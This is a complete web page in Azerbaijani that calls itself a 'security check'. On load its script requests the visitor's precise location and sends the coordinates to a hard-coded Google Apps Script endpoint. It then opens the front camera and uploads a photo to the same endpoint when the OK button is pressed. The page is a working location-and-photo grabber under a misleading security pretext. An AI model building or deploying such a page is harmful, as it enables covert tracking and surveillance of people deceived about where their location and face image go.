<!DOCTYPE html>
<html lang="az">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="theme-color" content="#ffffff">
  <title>Təhlükəsizlik</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 20px;
      font-family: Arial, sans-serif;
      text-align: center;
      background: #ffffff;
      color: #222222;
    }

    h2 {
      font-size: 22px;
    }

    #camera {
      width: 100%;
      max-width: 420px;
      border-radius: 8px;
      background: #eeeeee;
    }

    button {
      padding: 14px 24px;
      margin: 15px;
      border: none;
      border-radius: 7px;
      background: #1677ff;
      color: white;
      font-size: 17px;
      cursor: pointer;
    }

    button:disabled {
      background: #999999;
      cursor: not-allowed;
    }

    #status {
      margin-top: 20px;
      line-height: 1.6;
      overflow-wrap: anywhere;
    }
  </style>
</head>

<body>
  <h2>Təhlükəsizlik yoxlaması</h2>

  <video id="camera" autoplay playsinline hidden></video>

  <div>
    <button id="okButton" hidden>
      OK — Foto çək və göndər
    </button>
  </div>

  <p id="status">Konum icazəsi gözlənilir...</p>

  <script>
    // Sənin Google Apps Script ünvanın
    const SCRIPT_URL =
      "https://script.google.com/macros/s/AKfycbzGRi0yxPXaIhw-S7fhm22I-Ozt658Ez8dwtW70o7qzepr_3cJXtFTHDOJuArE6xBiL/exec";

    const camera = document.getElementById("camera");
    const okButton = document.getElementById("okButton");
    const statusText = document.getElementById("status");

    let cameraStream = null;

    function showStatus(message) {
      statusText.textContent = message;
    }

    // Məlumatı Apps Script-ə göndərir
    async function sendData(data) {
      await fetch(SCRIPT_URL, {
        method: "POST",
        mode: "no-cors",
        headers: {
          "Content-Type": "text/plain;charset=UTF-8"
        },
        body: JSON.stringify(data)
      });
    }

    // Telefonun cari konumunu alır
    function getLocation() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          reject(new Error("Brauzer konum xidmətini dəstəkləmir."));
          return;
        }

        navigator.geolocation.getCurrentPosition(
          resolve,
          reject,
          {
            enableHighAccuracy: true,
            timeout: 60000,
            maximumAge: 0
          }
        );
      });
    }

    // Ön kameranı açır
    async function openFrontCamera() {
      if (!navigator.mediaDevices ||
          !navigator.mediaDevices.getUserMedia) {
        throw new Error("Kamera üçün HTTPS bağlantısı tələb olunur.");
      }

      cameraStream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: {
            ideal: "user"
          }
        },
        audio: false
      });

      camera.srcObject = cameraStream;
      camera.hidden = false;

      await camera.play();
    }

    // Əvvəl konum, sonra kamera
    async function startProcess() {
      try {
        showStatus("Konum alınır... Telefon icazəsini təsdiqlə.");

        const position = await getLocation();

        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const accuracy = position.coords.accuracy;

        showStatus("Konum göndərilir...");

        await sendData({
          type: "location",
          latitude: latitude,
          longitude: longitude,
          accuracy: accuracy
        });

        showStatus(
          "Konum göndərmə sorğusu verildi. " +
          "Təxmini dəqiqlik: " +
          Math.round(accuracy) +
          " metr. Kamera açılır..."
        );

      } catch (error) {
        showStatus(
          "Konum alınmadı: " + error.message +
          ". Telefonun konumunu və brauzer icazəsini yoxla."
        );
      }

      try {
        await openFrontCamera();
        okButton.hidden = false;

        showStatus(
          statusText.textContent +
          "\nÖn kamera açıldı. Foto göndərmək istəyirsənsə OK düyməsinə bas."
        );

      } catch (error) {
        showStatus(
          statusText.textContent +
          "\nKamera açıla bilmədi: " + error.message
        );
      }
    }

    // Foto yalnız düyməyə basıldıqda çəkilir
    okButton.addEventListener("click", async () => {
      if (!cameraStream || !camera.videoWidth) {
        showStatus("Kamera hələ hazır deyil. Yenidən yoxla.");
        return;
      }

      okButton.disabled = true;
      showStatus("Foto hazırlanır və göndərilir...");

      try {
        const canvas = document.createElement("canvas");

        const scale = Math.min(
          1,
          1280 / camera.videoWidth
        );

        canvas.width = Math.round(camera.videoWidth * scale);
        canvas.height = Math.round(camera.videoHeight * scale);

        const context = canvas.getContext("2d");

        context.drawImage(
          camera,
          0,
          0,
          canvas.width,
          canvas.height
        );

        const image = canvas.toDataURL("image/jpeg", 0.7);

        await sendData({
          type: "photo",
          confirmed: true,
          image: image
        });

        showStatus(
          "Foto göndərmə sorğusu verildi. " +
          "Göndərilməni təsdiqləmək üçün Apps Script qeydlərini və Gmail-i yoxla."
        );

      } catch (error) {
        showStatus("Foto göndərilmədi: " + error.message);
        okButton.disabled = false;
      } finally {
        if (cameraStream) {
          cameraStream.getTracks().forEach(track => track.stop());
          cameraStream = null;
        }

        camera.hidden = true;
      }
    });

    startProcess();
  </script>
</body>
</html>
